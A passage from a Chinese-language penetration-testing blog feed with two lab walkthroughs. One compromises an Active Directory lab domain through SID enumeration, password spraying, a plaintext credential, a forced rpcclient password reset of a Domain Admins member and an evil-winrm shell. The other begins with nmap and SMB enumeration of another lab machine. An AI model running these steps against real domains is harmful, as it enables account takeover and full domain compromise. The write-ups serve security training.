  user.txt                            A       <span class="token number">70</span>  Thu Aug  <span class="token number">1</span> <span class="token number">13</span>:39:25 <span class="token number">2024</span>

		<span class="token number">12942591</span> blocks of size <span class="token number">4096</span>. <span class="token number">10832683</span> blocks available
smb: <span class="token punctuation">\</span><span class="token operator">></span> get user.txt
getting <span class="token function">file</span> <span class="token punctuation">\</span>user.txt of size <span class="token number">70</span> as user.txt <span class="token punctuation">(</span><span class="token number">4.3</span> KiloBytes/sec<span class="token punctuation">)</span> <span class="token punctuation">(</span>average <span class="token number">4.3</span> KiloBytes/sec<span class="token punctuation">)</span>
smb: <span class="token punctuation">\</span><span class="token operator">></span> get desktop.ini
getting <span class="token function">file</span> <span class="token punctuation">\</span>desktop.ini of size <span class="token number">282</span> as desktop.ini <span class="token punctuation">(</span><span class="token number">18.4</span> KiloBytes/sec<span class="token punctuation">)</span> <span class="token punctuation">(</span>average <span class="token number">11.1</span> KiloBytes/sec<span class="token punctuation">)</span></code></pre>
<p>顺利拿到user flag和一个桌面配置文件</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop/dc03<span class="token punctuation">]</span> ➜  <span class="token function">cat</span> desktop.ini                                                                                                                                                                                     <span class="token punctuation">[</span><span class="token number">19</span>:56:10<span class="token punctuation">]</span>
��
<span class="token punctuation">[</span>.ShellClassInfo<span class="token punctuation">]</span>
<span class="token assign-left variable">LocalizedResourceName</span><span class="token operator">=</span>@%SystemRoot%<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>shell32.dll,-21769
<span class="token assign-left variable">IconResource</span><span class="token operator">=</span>%SystemRoot%<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>imageres.dll,-183</code></pre>
<p>暂时不知道有什么用，继续信息搜集。</p>
<h2 id="攻击尝试"><a href="#攻击尝试" class="headerlink" title="攻击尝试"></a>攻击尝试</h2><pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop/dc03<span class="token punctuation">]</span> ➜  lookupsid.py xkate578@192.168.1.106                                                                                                                                                                 <span class="token punctuation">[</span><span class="token number">20</span>:00:10<span class="token punctuation">]</span>
Impacket v0.9.20 - Copyright <span class="token number">2019</span> SecureAuth Corporation

Password:
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Brute forcing SIDs at <span class="token number">192.168</span>.1.106
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> StringBinding ncacn_np:192.168.1.106<span class="token punctuation">[</span><span class="token punctuation">\</span>pipe<span class="token punctuation">\</span>lsarpc<span class="token punctuation">]</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Domain SID is: S-1-5-21-2986980474-46765180-2505414164
<span class="token number">498</span>: SOUPEDECODE<span class="token punctuation">\</span>Enterprise Read-only Domain Controllers <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token number">500</span>: SOUPEDECODE<span class="token punctuation">\</span>Administrator <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">501</span>: SOUPEDECODE<span class="token punctuation">\</span>Guest <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">502</span>: SOUPEDECODE<span class="token punctuation">\</span>krbtgt <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">512</span>: SOUPEDECODE<span class="token punctuation">\</span>Domain Admins <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token punctuation">..</span>.</code></pre>
<p>拿到一些用户名，处理一下数据</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop/dc03<span class="token punctuation">]</span> ➜  <span class="token function">cat</span> users.txt <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-Eo</span> <span class="token string">"CODE<span class="token entity" title="\\">\\</span><span class="token entity" title="\\">\\</span>\S*"</span> <span class="token operator">|</span> <span class="token function">sed</span> <span class="token string">'s/CODE\\//'</span> <span class="token operator">></span> users.txt </code></pre>
<p>爆破一下</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop/dc03<span class="token punctuation">]</span> ➜  crackmapexec smb <span class="token number">192.168</span>.1.106 <span class="token parameter variable">-u</span> users.txt <span class="token parameter variable">-p</span> users.txt --continue-on-success
SMB         <span class="token number">192.168</span>.1.106   <span class="token number">445</span>    DC01             <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Windows Server <span class="token number">2022</span> Build <span class="token number">20348</span> x64 <span class="token punctuation">(</span>name:DC01<span class="token punctuation">)</span> <span class="token punctuation">(</span>domain:SOUPEDECODE.LOCAL<span class="token punctuation">)</span> <span class="token punctuation">(</span>signing:True<span class="token punctuation">)</span> <span class="token punctuation">(</span>SMBv1:False<span class="token punctuation">)</span>
SMB         <span class="token number">192.168</span>.1.106   <span class="token number">445</span>    DC01             <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SOUPEDECODE.LOCAL<span class="token punctuation">\</span>Enterprise:Enterprise STATUS_LOGON_FAILURE 
SMB         <span class="token number">192.168</span>.1.106   <span class="token number">445</span>    DC01             <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SOUPEDECODE.LOCAL<span class="token punctuation">\</span>Enterprise:Administrator STATUS_LOGON_FAILURE 
SMB         <span class="token number">192.168</span>.1.106   <span class="token number">445</span>    DC01             <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SOUPEDECODE.LOCAL<span class="token punctuation">\</span>Enterprise:Guest STATUS_LOGON_FAILURE 
SMB         <span class="token number">192.168</span>.1.106   <span class="token number">445</span>    DC01             <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SOUPEDECODE.LOCAL<span class="token punctuation">\</span>Enterprise:krbtgt STATUS_LOGON_FAILURE 
SMB         <span class="token number">192.168</span>.1.106   <span class="token number">445</span>    DC01             <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SOUPEDECODE.LOCAL<span class="token punctuation">\</span>Enterprise:Domain STATUS_LOGON_FAILURE 
SMB         <span class="token number">192.168</span>.1.106   <span class="token number">445</span>    DC01             <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SOUPEDECODE.LOCAL<span class="token punctuation">\</span>Enterprise:Domain STATUS_LOGON_FAILURE 
SMB         <span class="token number">192.168</span>.1.106   <span class="token number">445</span>    DC01             <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SOUPEDECODE.LOCAL<span class="token punctuation">\</span>Enterprise:Domain STATUS_LOGON_FAILURE 
<span class="token punctuation">..</span>.
<span class="token punctuation">..</span>.</code></pre>
<p>全是failure。<br>尝试as-rep</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop/dc03<span class="token punctuation">]</span> ➜  GetNPUsers.py <span class="token parameter variable">-usersfile</span> users.txt -no-pass -dc-ip <span class="token number">192.168</span>.1.106 soupedecode.local/ </code></pre>
<p>依然全是失败，没有没开预认证的用户，可能还得从XKATE578这个用户下手</p>
<h2 id="ldap信息收集"><a href="#ldap信息收集" class="headerlink" title="ldap信息收集"></a>ldap信息收集</h2><p>尝试使用<code>ldapdomaindump</code>获取域内成员信息</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop/dc03<span class="token punctuation">]</span> ➜  python <span class="token parameter variable">-m</span> ldapdomaindump <span class="token parameter variable">-u</span> SOUPEDECODE.LOCAL<span class="token punctuation">\</span><span class="token punctuation">\</span>XKATE578 <span class="token parameter variable">-p</span> <span class="token string">'jesuschrist'</span>  <span class="token number">192.168</span>.1.107                                                                                                             <span class="token punctuation">[</span><span class="token number">20</span>:59:29<span class="token punctuation">]</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Connecting to host<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Binding to <span class="token function">host</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Bind OK
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Starting domain dump
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Domain dump finished</code></pre>
<p><img src="https://imgos.cn/2024/08/12/66ba070060b97.png" alt="1723467796886.png" loading="lazy"><br>发现这个用户是在<code>Account Operators</code>这个组里面，看一下这个组的权限<br><img src="https://imgos.cn/2024/08/12/66ba078ef367c.png" alt="1723467941885.png" loading="lazy"><br>这个组的成员可以管理域用户和组账户，但是不能管理域管理员。<br>只能从其他成员下手。<br><img src="https://imgos.cn/2024/08/12/66ba0821bcac8.png" alt="1723468087222.png" loading="lazy"><br>找到一个比较特殊的成员&#96;&#96;，他在Operators这个组里面<br><img src="https://imgos.cn/2024/08/12/66ba0970b551c.png" alt="1723468424115.png" loading="lazy"><br>跟随一下，发现这个组是域管理员组的成员。如果能修改这个成员的密码，也就是拿到了域管理员权限。</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>因为登录不了winrm，只能通过rpc协议来进行登录<br><a href="https://cloud.tencent.com/developer/article/1850814">https://cloud.tencent.com/developer/article/1850814</a><br>在这篇文章找到了rpcclient比较全的指令,尝试强制修改密码</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">roott@kali2 <span class="token punctuation">[</span>~/Desktop/dc03<span class="token punctuation">]</span> ➜  rpcclient <span class="token parameter variable">-U</span> <span class="token string">"xkate578"</span>  <span class="token number">192.168</span>.1.107                                                                                                                                                              <span class="token punctuation">[</span><span class="token number">21</span>:21:18<span class="token punctuation">]</span>
Password <span class="token keyword">for</span> <span class="token punctuation">[</span>WORKGROUP<span class="token punctuation">\</span>xkate578<span class="token punctuation">]</span>:
rpcclient $<span class="token operator">></span> setuserinfo2 fbeth103 <span class="token number">23</span> Passw0rd<span class="token operator">!</span>
result: NT_STATUS_ACCESS_DENIED
result was NT_STATUS_ACCESS_DENIED</code></pre>
<p>???<br>去dc上发现原来这是个设置，靶机因为安全策略十几分钟后会锁定不准修改fbeth103密码，只能重新导入靶机了。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop/dc03<span class="token punctuation">]</span> ➜  rpcclient <span class="token parameter variable">-U</span> <span class="token string">"xkate578"</span>  <span class="token number">192.168</span>.1.108                                                                                                                                                              <span class="token punctuation">[</span><span class="token number">21</span>:29:15<span class="token punctuation">]</span>
Password <span class="token keyword">for</span> <span class="token punctuation">[</span>WORKGROUP<span class="token punctuation">\</span>xkate578<span class="token punctuation">]</span>:
rpcclient $<span class="token operator">></span> setuserinfo2 fbeth103 <span class="token number">23</span> passw0rd<span class="token operator">!</span>
rpcclient $<span class="token operator">></span> </code></pre>
<p>这次应该修改成了。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop/dc03<span class="token punctuation">]</span> ➜  evil-winrm <span class="token parameter variable">-i</span> <span class="token number">192.168</span>.1.108 <span class="token parameter variable">-u</span> <span class="token string">"fbeth103"</span> <span class="token parameter variable">-p</span> passw0rd<span class="token operator">!</span>                                                                                                                                              <span class="token punctuation">[</span><span class="token number">21</span>:29:26<span class="token punctuation">]</span>
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">function</span> is unimplemented on this machine
                                        
Data: For <span class="token function">more</span> information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="token comment">#Remote-path-completion</span>
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>fbeth103<span class="token punctuation">\</span>Documents<span class="token operator">></span> <span class="token function">whoami</span>
soupedecode<span class="token punctuation">\</span>fbeth103
*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>fbeth103<span class="token punctuation">\</span>Documents<span class="token operator">></span> <span class="token function">whoami</span> /all

<span class="token environment constant">USER</span> INFORMATION
----------------

User Name            SID
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
soupedecode<span class="token punctuation">\</span>fbeth103 S-1-5-21-2986980474-46765180-2505414164-1221


GROUP INFORMATION
-----------------

Group Name                                         Type             SID                                          Attributes
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Everyone                                           Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN<span class="token punctuation">\</span>Users                                      Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN<span class="token punctuation">\</span>Pre-Windows <span class="token number">2000</span> Compatible Access         Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
BUILTIN<span class="token punctuation">\</span>Administrators                             Alias            S-1-5-32-544                                 Mandatory group, Enabled by default, Enabled group, Group owner
NT AUTHORITY<span class="token punctuation">\</span>NETWORK                               Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span class="token punctuation">\</span>Authenticated Users                   Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span class="token punctuation">\</span>This Organization                     Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
SOUPEDECODE<span class="token punctuation">\</span>Operators                              Group            S-1-5-21-2986980474-46765180-2505414164-2165 Mandatory group, Enabled by default, Enabled group
SOUPEDECODE<span class="token punctuation">\</span>Domain Admins                          Group            S-1-5-21-2986980474-46765180-2505414164-512  Mandatory group, Enabled by default, Enabled group
SOUPEDECODE<span class="token punctuation">\</span>Denied RODC Password Replication Group Alias            S-1-5-21-2986980474-46765180-2505414164-572  Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY<span class="token punctuation">\</span>NTLM Authentication                   Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label<span class="token punctuation">\</span>High Mandatory Level               Label            S-1-16-12288</code></pre>
<p>确实是域管理员组</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">*Evil-WinRM* PS C:<span class="token punctuation">\</span>users<span class="token punctuation">\</span>administrator<span class="token punctuation">\</span>desktop<span class="token operator">></span> <span class="token builtin class-name">type</span> root.txt
.*</code></pre>
<p>拿下。</p>
]]></content>
      <categories>
        <category>HackMyVM</category>
      </categories>
      <tags>
        <tag>Spoofing_LLMNR</tag>
        <tag>Account_Operators</tag>
        <tag>rpcclient</tag>
      </tags>
  </entry>
  <entry>
    <title>thehackerslabs-Pacharan</title>
    <url>/posts/c36651be/</url>
    <content><![CDATA[<p><strong>难度:AVANZADO</strong></p>
<p><strong>kali:192.168.69.3</strong></p>
<p><strong>靶机:192.168.69.69</strong></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~<span class="token punctuation">]</span> ➜  arp-scan <span class="token parameter variable">-l</span>                                                                                                                                                                            <span class="token punctuation">[</span><span class="token number">11</span>:35:54<span class="token punctuation">]</span> Interface: eth0, type: EN10MB, MAC: 00:0c:29:d2:e0:49, IPv4: <span class="token number">192.168</span>.69.3
Starting arp-scan <span class="token number">1.10</span>.0 with <span class="token number">256</span> hosts <span class="token punctuation">(</span>https://github.com/royhills/arp-scan<span class="token punctuation">)</span>
<span class="token number">192.168</span>.69.1    0a:00:27:00:00:12       <span class="token punctuation">(</span>Unknown: locally administered<span class="token punctuation">)</span>
<span class="token number">192.168</span>.69.2    08:00:27:7f:d6:6c       PCS Systemtechnik GmbH
<span class="token number">192.168</span>.69.69   08:00:27:f2:3b:fe       PCS Systemtechnik GmbH</code></pre>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop/pacharan<span class="token punctuation">]</span> ➜  nmap <span class="token parameter variable">-n</span> <span class="token parameter variable">-Pn</span> <span class="token parameter variable">-sS</span> -p- --min-rate<span class="token operator">=</span><span class="token string">"5000"</span> <span class="token number">192.168</span>.69.69 <span class="token parameter variable">-oG</span> ports.txt                                                                                                     <span class="token punctuation">[</span><span class="token number">11</span>:38:51<span class="token punctuation">]</span> Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-08-08 <span class="token number">11</span>:38 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.69.69
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.000091s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65510</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT      STATE SERVICE
<span class="token number">53</span>/tcp    <span class="token function">open</span>  domain
<span class="token number">88</span>/tcp    <span class="token function">open</span>  kerberos-sec
<span class="token number">135</span>/tcp   <span class="token function">open</span>  msrpc
<span class="token number">139</span>/tcp   <span class="token function">open</span>  netbios-ssn
<span class="token number">389</span>/tcp   <span class="token function">open</span>  ldap
<span class="token number">445</span>/tcp   <span class="token function">open</span>  microsoft-ds
<span class="token number">464</span>/tcp   <span class="token function">open</span>  kpasswd5
<span class="token number">593</span>/tcp   <span class="token function">open</span>  http-rpc-epmap
<span class="token number">636</span>/tcp   <span class="token function">open</span>  ldapssl
<span class="token number">3268</span>/tcp  <span class="token function">open</span>  globalcatLDAP
<span class="token number">3269</span>/tcp  <span class="token function">open</span>  globalcatLDAPssl
<span class="token number">5985</span>/tcp  <span class="token function">open</span>  wsman
<span class="token number">9389</span>/tcp  <span class="token function">open</span>  adws
<span class="token number">47001</span>/tcp <span class="token function">open</span>  winrm
<span class="token number">49664</span>/tcp <span class="token function">open</span>  unknown
<span class="token number">49665</span>/tcp <span class="token function">open</span>  unknown
<span class="token number">49666</span>/tcp <span class="token function">open</span>  unknown
<span class="token number">49667</span>/tcp <span class="token function">open</span>  unknown
<span class="token number">49669</span>/tcp <span class="token function">open</span>  unknown
<span class="token number">49670</span>/tcp <span class="token function">open</span>  unknown
<span class="token number">49671</span>/tcp <span class="token function">open</span>  unknown
<span class="token number">49673</span>/tcp <span class="token function">open</span>  unknown
<span class="token number">49676</span>/tcp <span class="token function">open</span>  unknown
<span class="token number">49686</span>/tcp <span class="token function">open</span>  unknown
<span class="token number">49709</span>/tcp <span class="token function">open</span>  unknown
MAC Address: 08:00:27:F2:3B:FE <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span></code></pre>
<p>扫一下端口服务</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop/pacharan<span class="token punctuation">]</span> ➜  <span class="token function">cat</span> ports.txt <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-oP</span> <span class="token string">'\d&#123;1,5&#125;/open'</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print $1&#125;'</span> <span class="token assign-left variable">FS</span><span class="token operator">=</span><span class="token string">'/'</span> <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token operator">|</span> <span class="token function">tr</span> <span class="token string">' '</span> <span class="token string">','</span>                                                                                <span class="token punctuation">[</span><span class="token number">11</span>:39:05<span class="token punctuation">]</span> <span class="token number">53,88</span>,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49669,49670,49671,49673,49676,49686,49709
root@kali2 <span class="token punctuation">[</span>~/Desktop/pacharan<span class="token punctuation">]</span> ➜  nmap <span class="token parameter variable">-sV</span> <span class="token parameter variable">-A</span> <span class="token number">192.168</span>.69.69 -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49669,49670,49671,49673,49676,49686,4970              <span class="token punctuation">[</span><span class="token number">11</span>:39:19<span class="token punctuation">]</span> Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-08-08 <span class="token number">11</span>:39 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.69.69
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00020s latency<span class="token punctuation">)</span>.

PORT      STATE  SERVICE       VERSION
<span class="token number">53</span>/tcp    <span class="token function">open</span>   domain        Simple DNS Plus
<span class="token number">88</span>/tcp    <span class="token function">open</span>   kerberos-sec  Microsoft Windows Kerberos <span class="token punctuation">(</span>server time: <span class="token number">2024</span>-08-08 09:40:12Z<span class="token punctuation">)</span>
<span class="token number">135</span>/tcp   <span class="token function">open</span>   msrpc         Microsoft Windows RPC
<span class="token number">139</span>/tcp   <span class="token function">open</span>   netbios-ssn   Microsoft Windows netbios-ssn
<span class="token number">389</span>/tcp   <span class="token function">open</span>   ldap          Microsoft Windows Active Directory LDAP <span class="token punctuation">(</span>Domain: PACHARAN.THL, Site: Default-First-Site-Name<span class="token punctuation">)</span>
<span class="token number">445</span>/tcp   <span class="token function">open</span>   microsoft-ds?
<span class="token number">464</span>/tcp   <span class="token function">open</span>   kpasswd5?
<span class="token number">593</span>/tcp   <span class="token function">open</span>   ncacn_http    Microsoft Windows RPC over HTTP <span class="token number">1.0</span>
<span class="token number">636</span>/tcp   <span class="token function">open</span>   tcpwrapped
<span class="token number">3268</span>/tcp  <span class="token function">open</span>   ldap          Microsoft Windows Active Directory LDAP <span class="token punctuation">(</span>Domain: PACHARAN.THL, Site: Default-First-Site-Name<span class="token punctuation">)</span>
<span class="token number">3269</span>/tcp  <span class="token function">open</span>   tcpwrapped
<span class="token number">4970</span>/tcp  closed ccss-qsm
<span class="token number">5985</span>/tcp  <span class="token function">open</span>   http          Microsoft HTTPAPI httpd <span class="token number">2.0</span> <span class="token punctuation">(</span>SSDP/UPnP<span class="token punctuation">)</span>
<span class="token operator">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
<span class="token operator">|</span>_http-title: Not Found
<span class="token number">9389</span>/tcp  <span class="token function">open</span>   mc-nmf        .NET Message Framing
<span class="token number">47001</span>/tcp <span class="token function">open</span>   http          Microsoft HTTPAPI httpd <span class="token number">2.0</span> <span class="token punctuation">(</span>SSDP/UPnP<span class="token punctuation">)</span>
<span class="token operator">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
<span class="token operator">|</span>_http-title: Not Found
<span class="token number">49664</span>/tcp <span class="token function">open</span>   msrpc         Microsoft Windows RPC
<span class="token number">49665</span>/tcp <span class="token function">open</span>   msrpc         Microsoft Windows RPC
<span class="token number">49666</span>/tcp <span class="token function">open</span>   msrpc         Microsoft Windows RPC
<span class="token number">49667</span>/tcp <span class="token function">open</span>   msrpc         Microsoft Windows RPC
<span class="token number">49669</span>/tcp <span class="token function">open</span>   msrpc         Microsoft Windows RPC
<span class="token number">49670</span>/tcp <span class="token function">open</span>   ncacn_http    Microsoft Windows RPC over HTTP <span class="token number">1.0</span>
<span class="token number">49671</span>/tcp <span class="token function">open</span>   msrpc         Microsoft Windows RPC
<span class="token number">49673</span>/tcp <span class="token function">open</span>   msrpc         Microsoft Windows RPC
<span class="token number">49676</span>/tcp <span class="token function">open</span>   msrpc         Microsoft Windows RPC
<span class="token number">49686</span>/tcp <span class="token function">open</span>   msrpc         Microsoft Windows RPC</code></pre>
<p>拿到一个域名<code>PACHARAN.THL</code></p>
<h2 id="SMB探测"><a href="#SMB探测" class="headerlink" title="SMB探测"></a>SMB探测</h2><p>枚举不到用户信息，看一下目录</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop/pacharan<span class="token punctuation">]</span> ➜  smbclient --no-pass <span class="token parameter variable">-L</span> //pacharan.thl                                                                                                                                 <span class="token punctuation">[</span><span class="token number">11</span>:47:23<span class="token punctuation">]</span>

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Admin remota
        C$              Disk      Recurso predeterminado
        IPC$            IPC       IPC remota
        NETLOGON        Disk      Recurso compartido del servidor de inicio de sesión
        NETLOGON2       Disk
        PACHARAN        Disk
        PDF Pro Virtual Printer Printer   Soy Hacker y arreglo impresoras
        print$          Disk      Controladores de impresora
        SYSVOL          Disk      Recurso compartido del servidor de inicio de sesión
        Users           Disk
Reconnecting with SMB1 <span class="token keyword">for</span> workgroup listing.
do_connect: Connection to pacharan.thl failed <span class="token punctuation">(</span>Error NT_STATUS_RESOURCE_NAME_NOT_FOUND<span class="token punctuation">)</span>
Unable to connect with SMB1 -- no workgroup available</code></pre>
<p>有个打印服务,还有两个登录脚本共享</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop/pacharan<span class="token punctuation">]</span> ➜  smbclient //pacharan.thl/<span class="token string">"PDF Pro Virtual Printer"</span> --no-pass                                                                                                          <span class="token punctuation">[</span><span class="token number">11</span>:50:57<span class="token punctuation">]</span> Try <span class="token string">"help"</span> to get a list of possible commands.
smb: <span class="token punctuation">\</span><span class="token operator">></span> <span class="token function">ls</span>
NT_STATUS_OBJECT_NAME_NOT_FOUND listing <span class="token punctuation">\</span>*
smb: <span class="token punctuation">\</span><span class="token operator">></span> ^C
root@kali2 <span class="token punctuation">[</span>~/Desktop/pacharan<span class="token punctuation">]</span> ➜  smbclient //pacharan.thl/<span class="token string">"print$"</span> --no-pass                                                                                                                           <span class="token punctuation">[</span><span class="token number">11</span>:51:48<span class="token punctuation">]</span> Try <span class="token string">"help"</span> to get a list of possible commands.
smb: <span class="token punctuation">\</span><span class="token operator">></span> <span class="token function">ls</span>
NT_STATUS_ACCESS_DENIED listing <span class="token punctuation">\</span>*
smb: <span class="token punctuation">\</span><span class="token operator">></span> ^C
root@kali2 <span class="token punctuation">[</span>~/Desktop/pacharan<span class="token punctuation">]</span> ➜  smbclient //pacharan.thl/NETLOGON --no-pass                                                                                                                           <span class="token punctuation">[</span><span class="token number">11</span>:51:53<span class="token punctuation">]</span> do_connect: Connection to WIN-VRU3GG3DPLJ.PACHARAN.THL failed <span class="token punctuation">(</span>Error NT_STATUS_UNSUCCESSFUL<span class="token punctuation">)</span>
root@kali2 <span class="token punctuation">[</span>~/Desktop/pacharan<span class="token punctuation">]</span> ➜  smbclient //pacharan.thl/NETLOGON2 --no-pass                                                                                                                          <span class="token punctuation">[</span><span class="token number">11</span>:52:28<span class="token punctuation">]</span> Try <span class="token string">"help"</span> to get a list of possible commands.
smb: <span class="token punctuation">\</span><span class="token operator">></span> <span class="token function">ls</span>
  <span class="token builtin class-name">.</span>                                   D        <span class="token number">0</span>  Thu Aug  <span class="token number">1</span> 01:25:34 <span class="token number">2024</span>
  <span class="token punctuation">..</span>                                  D        <span class="token number">0</span>  Thu Aug  <span class="token number">1</span> 01:25:34 <span class="token number">2024</span>
  Orujo.txt                           A       <span class="token number">22</span>  Thu Aug  <span class="token number">1</span> 01:25:55 <span class="token number">2024</span>

                <span class="token number">7735807</span> blocks of size <span class="token number">4096</span>. <span class="token number">4357968</span> blocks available
smb: <span class="token punctuation">\</span><span class="token operator">></span> get Orujo.txt
